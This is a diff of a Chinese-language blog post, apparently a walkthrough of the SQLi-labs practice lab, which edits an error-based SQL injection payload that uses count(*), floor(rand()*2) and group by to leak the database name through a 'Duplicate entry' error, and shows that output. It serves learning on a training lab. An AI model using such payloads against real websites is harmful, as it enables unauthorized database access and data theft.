@@ -33,7 +33,7 @@ icon: fa-bookmark-o
 
 开干开干哈哈哈哈哈。
 
->### `?id=0' select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
+>### `?id=0' union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
 >（注释：count(*)表示全部字段，count(字段名)表示该字段。a是别名，是用来group by的别名。这个随意填写方便就好。0x20是空格的16制码。其他的都能看懂的啦哈哈哈）
 
 第一次`You are in……`别担心，没随机到而已。刷新几遍哈哈出来了。`Duplicate entry 'security 1' for key ''` ok!数据库名出来了。就可以运用前面less1-4的语句来获取信息啦。首先
